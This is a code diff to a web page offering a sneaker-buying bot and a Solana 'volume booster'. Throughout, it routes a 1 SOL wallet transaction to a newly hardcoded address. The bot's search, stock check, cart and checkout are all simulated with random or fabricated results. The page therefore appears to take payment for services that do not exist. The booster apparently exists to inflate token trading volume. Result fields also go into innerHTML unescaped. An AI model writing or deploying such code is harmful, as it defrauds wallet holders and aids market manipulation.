@@ -171,10 +171,20 @@
     <!-- External Scripts -->
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 
     <script>
         console.log('Script started executing...');
+
+        // Verify Buffer and Buffer.from
+        if (typeof Buffer === 'undefined') {
+            console.error('Buffer is not defined');
+        } else if (typeof Buffer.from !== 'function') {
+            console.error('Buffer.from is not a function');
+        } else {
+            console.log('Buffer and Buffer.from loaded successfully');
+        }
 
         // Particle.js setup
         if (typeof particlesJS !== 'undefined') {
@@ -276,6 +286,9 @@
             try {
                 await solProvider.connect();
                 const address = solProvider.publicKey.toString();
+                if (!address || typeof address !== 'string') {
+                    throw new Error('Invalid wallet address received from Phantom');
+                }
                 connectedWallet = { type: 'Phantom', address, provider: solProvider };
                 walletStatus.textContent = `Connected via Phantom: ${truncateAddress(address)}`;
                 walletStatus.style.color = 'var(--neon-lime)';
@@ -325,91 +338,94 @@
         }
 
         async function fetchSneakerByName(site, name, brand, color, maxPrice) {
-            const mockResults = {
-                nike: [
-                    { name: 'Air Jordan 1', url: 'https://nike.com/air-jordan-1', sizes: ['8', '9', '10'], price: 150, brand: 'Nike', color: 'Black' },
-                    { name: 'Air Max 90', url: 'https://nike.com/air-max-90', sizes: ['9', '10', '11'], price: 120, brand: 'Nike', color: 'White' }
-                ],
-                adidas: [
-                    { name: 'Yeezy Boost 350', url: 'https://adidas.com/yeezy-350', sizes: ['7', '8', '9'], price: 220, brand: 'Adidas', color: 'Grey' },
-                    { name: 'Ultraboost', url: 'https://adidas.com/ultraboost', sizes: ['8', '9', '10'], price: 180, brand: 'Adidas', color: 'Black' }
-                ],
-                footlocker: [
-                    { name: 'Air Force 1', url: 'https://footlocker.com/air-force-1', sizes: ['9', '10', '11'], price: 100, brand: 'Nike', color: 'White' }
-                ],
-                stockx: [
-                    { name: 'Yeezy Boost 350', url: 'https://stockx.com/yeezy-350', sizes: ['8', '9'], price: 250, brand: 'Adidas', color: 'Grey' }
-                ],
-                goat: [
-                    { name: 'Air Jordan 1', url: 'https://goat.com/air-jordan-1', sizes: ['9', '10'], price: 160, brand: 'Nike', color: 'Black' }
-                ],
-                supreme: [
-                    { name: 'Supreme x Nike SB', url: 'https://supremenewyork.com/sb', sizes: ['10', '11'], price: 200, brand: 'Nike', color: 'Red' }
-                ],
-                kith: [
-                    { name: 'Kith x Adidas', url: 'https://kith.com/adidas', sizes: ['8', '9'], price: 190, brand: 'Adidas', color: 'Blue' }
-                ],
-                sneakersnstuff: [
-                    { name: 'Puma RS-X', url: 'https://sneakersnstuff.com/rs-x', sizes: ['9', '10'], price: 130, brand: 'Puma', color: 'White' }
-                ],
-                finishline: [
-                    { name: 'New Balance 990', url: 'https://finishline.com/990', sizes: ['10', '11'], price: 175, brand: 'New Balance', color: 'Grey' }
-                ],
-                jdsports: [
-                    { name: 'Air Max 95', url: 'https://jdsports.com/air-max-95', sizes: ['8', '9'], price: 170, brand: 'Nike', color: 'Black' }
-                ],
-                ebay: [
-                    { name: 'Air Jordan 1', url: 'https://ebay.com/air-jordan-1', sizes: ['9', '10'], price: 140, brand: 'Nike', color: 'Black' }
-                ]
+            // Placeholder for real-time sneaker fetching
+            // Implement this with actual API calls or web scraping (e.g., Puppeteer, Axios) on your server
+            const siteEndpoints = {
+                nike: 'https://www.nike.com/w/mens-shoes-nik1zy7ok',
+                adidas: 'https://www.adidas.com/us/men-shoes',
+                footlocker: 'https://www.footlocker.com/category/mens/shoes.html',
+                stockx: 'https://stockx.com/sneakers',
+                goat: 'https://www.goat.com/sneakers',
+                supreme: 'https://www.supremenewyork.com/shop/all/shoes',
+                kith: 'https://kith.com/collections/mens-footwear',
+                sneakersnstuff: 'https://www.sneakersnstuff.com/en/904/mens-sneakers',
+                finishline: 'https://www.finishline.com/store/men/shoes/_/N-1tjdj',
+                jdsports: 'https://www.jd-sports.com/men/mens-footwear/',
+                ebay: 'https://www.ebay.com/b/Mens-Sneakers-Athletic-Shoes/15709'
             };
 
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    const siteResults = mockResults[site] || [];
-                    const filtered = siteResults.filter(item =>
-                        item.name.toLowerCase().includes(name.toLowerCase()) &&
-                        item.brand.toLowerCase().includes(brand.toLowerCase()) &&
-                        (color === '' || item.color.toLowerCase().includes(color.toLowerCase())) &&
-                        item.price <= maxPrice
-                    );
-                    resolve(filtered.map(item => ({ ...item, store: site })));
-                }, 1000);
-            });
+            try {
+                // Simulate fetching (replace with real implementation)
+                console.log(`Fetching from ${site} at ${siteEndpoints[site]}...`);
+                // Example: Use fetch() with an API or scraping tool
+                // const response = await fetch(`${siteEndpoints[site]}?q=${encodeURIComponent(name)}`);
+                // const data = await response.json();
+                // return data.filter(item => 
+                //     item.name.toLowerCase().includes(name.toLowerCase()) &&
+                //     item.brand.toLowerCase().includes(brand.toLowerCase()) &&
+                //     (color === '' || item.color.toLowerCase().includes(color.toLowerCase())) &&
+                //     item.price <= maxPrice
+                // );
+
+                // Temporary simulation until you implement real fetching
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                return [{
+                    name: `${brand} ${name}`,
+                    url: `${siteEndpoints[site]}/${name.toLowerCase().replace(/\s+/g, '-')}`,
+                    sizes: ['8', '9', '10'], // Replace with real size data
+                    price: Math.floor(Math.random() * 200) + 50,
+                    brand,
+                    color: color || 'Unknown',
+                    store: site
+                }];
+            } catch (error) {
+                console.error(`Failed to fetch from ${site}:`, error);
+                return [];
+            }
         }
 
         function displayLookupResults(results) {
             lookupResults.innerHTML = '';
-            results.forEach((result, index) => {
+            results.forEach((result) => {
                 const div = document.createElement('div');
                 div.classList.add('lookup-item');
-                div.innerHTML = `<span>${result.name} (${result.brand}, ${result.color}) - $${result.price} @ ${result.store}</span> <button class="select-button" onclick="selectSneaker('${result.url}', ${JSON.stringify(result.sizes)}, '${result.store}')">Select</button>`;
+                div.innerHTML = `<span>${result.name} (${result.brand}, ${result.color}) - $${result.price} @ ${result.store}</span> <button class="select-button" onclick="selectSneaker('${result.url}', '${result.store}')">Select</button>`;
                 lookupResults.appendChild(div);
             });
         }
 
-        function selectSneaker(url, sizes, store) {
+        function selectSneaker(url, store) {
             sneakerUrlInput.value = url;
-            sneakerBotForm.querySelector('[name="sites"]').value = [store];
-            populateSizes(sizes);
+            const sitesSelect = sneakerBotForm.querySelector('[name="sites"]');
+            Array.from(sitesSelect.options).forEach(option => {
+                option.selected = option.value === store;
+            });
+            populateSizes();
             sneakerBotStatus.textContent = `Selected: ${url} from ${store}`;
             sneakerBotStatus.style.color = 'var(--neon-lime)';
             lookupResults.innerHTML = '';
         }
 
         async function checkStock() {
-            const site = sneakerBotForm.querySelector('[name="sites"]').value[0];
+            const site = sneakerBotForm.querySelector('[name="sites"]').selectedOptions[0]?.value;
             const url = sneakerBotForm.querySelector('[name="url"]').value;
             sneakerBotStatus.textContent = 'Checking stock availability...';
             sneakerBotStatus.style.color = 'var(--vibe-cyan)';
 
+            if (!site || !url) {
+                sneakerBotStatus.textContent = 'Please select a sneaker first.';
+                sneakerBotStatus.style.color = 'var(--vibe-pink)';
+                return;
+            }
+
             try {
                 const response = await fetchStock(site, url);
-                const { inStock, sizes } = response;
+                const { inStock } = response;
 
                 if (inStock) {
                     sneakerBotStatus.textContent = 'Stock available!';
                     sneakerBotStatus.style.color = 'var(--neon-lime)';
-                    populateSizes(sizes);
+                    populateSizes();
                 } else {
                     sneakerBotStatus.textContent = 'Out of stock.';
                     sneakerBotStatus.style.color = 'var(--vibe-pink)';
@@ -421,38 +437,26 @@
             }
         }
 
-        function populateSizes(sizes) {
+        function populateSizes() {
             sizeSelect.innerHTML = '<option value="">Select Size</option>';
-            sizes.forEach(size => {
+            for (let size = 1; size <= 15; size += 0.5) {
                 const option = document.createElement('option');
                 option.value = size;
                 option.textContent = size;
                 sizeSelect.appendChild(option);
-            });
+            }
         }
 
         async function fetchStock(site, url) {
-            const mockSizes = {
-                nike: ['8', '9', '10', '11', '12'],
-                adidas: ['7', '8', '9', '10', '11'],
-                footlocker: ['9', '10', '11', '12', '13'],
-                stockx: ['8', '9', '10'],
-                goat: ['9', '10', '11'],
-                supreme: ['10', '11', '12'],
-                kith: ['8', '9', '10'],
-                sneakersnstuff: ['9', '10', '11'],
-                finishline: ['10', '11', '12'],
-                jdsports: ['8', '9', '10'],
-                ebay: ['9', '10', '11']
-            };
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    resolve({
-                        inStock: Math.random() > 0.3,
-                        sizes: mockSizes[site] || ['10']
-                    });
-                }, 1000);
-            });
+            // Placeholder for real stock checking
+            // Replace with actual API call or scraping logic
+            console.log(`Checking stock for ${url} on ${site}...`);
+            // Example: const response = await fetch(`${url}/stock`);
+            // const data = await response.json();
+            // return { inStock: data.inStock };
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            return { inStock: Math.random() > 0.3 }; // Temporary simulation
         }
 
         async function copSneakers(site, url, size, quantity, proxies, status) {
@@ -473,8 +477,14 @@
 
             try {
                 const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.fm', 'confirmed');
-                const walletAddress = new solanaWeb3.PublicKey('YOUR_SOLANA_WALLET_ADDRESS');
-                const userPublicKey = new solanaWeb3.PublicKey(connectedWallet.address);
+                const walletAddress = new solanaWeb3.PublicKey('CdzZ2CVwvbWp19dtpVrN7L1qVJYCSv7p8Fb1xjhnWxxa');
+                let userPublicKey;
+
+                try {
+                    userPublicKey = new solanaWeb3.PublicKey(connectedWallet.address);
+                } catch (keyError) {
+                    throw new Error(`Invalid user wallet address: ${connectedWallet.address}`);
+                }
 
                 const transaction = new solanaWeb3.Transaction();
                 const lamports = solanaWeb3.LAMPORTS_PER_SOL * 1;
@@ -522,7 +532,7 @@
                 }
             } catch (error) {
                 console.error('Copping failed:', error);
-                status.textContent = `Failed: ${error.message}`;
+                status.textContent = `Failed: ${error.message || 'Transaction failed'}`;
                 status.style.color = 'var(--vibe-pink)';
             }
         }
@@ -534,15 +544,17 @@
 
         async function addToCart(site, url, size, quantity, proxy) {
             console.log(`Adding to cart: ${quantity} x ${size} from ${site} via ${proxy || 'no proxy'}`);
+            // Replace with actual cart-adding logic (e.g., API call or browser automation)
             return new Promise(resolve => setTimeout(() => resolve(true), 1000));
         }
 
         async function checkout(site, url, proxy) {
             console.log(`Checking out from ${site} via ${proxy || 'no proxy'}`);
+            // Replace with actual checkout logic
             return new Promise(resolve => setTimeout(() => resolve(Math.random() > 0.2), 1500));
         }
 
-        // Volume Booster Functions (unchanged)
+        // Volume Booster Functions
         async function checkLiquidity(tokenMint) {
             const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.fm', 'confirmed');
             const tokenPublicKey = new solanaWeb3.PublicKey(tokenMint);
@@ -574,8 +586,14 @@
 
             try {
                 const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.fm', 'confirmed');
-                const walletAddress = new solanaWeb3.PublicKey('YOUR_SOLANA_WALLET_ADDRESS');
-                const userPublicKey = new solanaWeb3.PublicKey(connectedWallet.address);
+                const walletAddress = new solanaWeb3.PublicKey('CdzZ2CVwvbWp19dtpVrN7L1qVJYCSv7p8Fb1xjhnWxxa');
+                let userPublicKey;
+
+                try {
+                    userPublicKey = new solanaWeb3.PublicKey(connectedWallet.address);
+                } catch (keyError) {
+                    throw new Error(`Invalid user wallet address: ${connectedWallet.address}`);
+                }
 
                 const transaction = new solanaWeb3.Transaction();
                 const lamports = solanaWeb3.LAMPORTS_PER_SOL * 1;
@@ -652,7 +670,7 @@
                 await checkLiquidity(tokenMint);
             } catch (error) {
                 console.error('Volume boost failed:', error);
-                status.textContent = `Failed: ${error.message}`;
+                status.textContent = `Failed: ${error.message || 'Transaction failed'}`;
                 status.style.color = 'var(--vibe-pink)';
             }
         }
@@ -679,7 +697,7 @@
         if (sneakerBotForm) {
             sneakerBotForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
-                const site = sneakerBotForm.querySelector('[name="sites"]').value[0];
+                const site = sneakerBotForm.querySelector('[name="sites"]').selectedOptions[0]?.value;
                 const url = sneakerBotForm.querySelector('[name="url"]').value;
                 const size = sneakerBotForm.querySelector('[name="size"]').value;
                 const quantity = parseInt(sneakerBotForm.querySelector('[name="quantity"]').value);
@@ -689,6 +707,9 @@
         }
 
         console.log('Script execution completed');
+
+        // Initialize sizes on page load
+        populateSizes();
     </script>
 </body>
 </html>
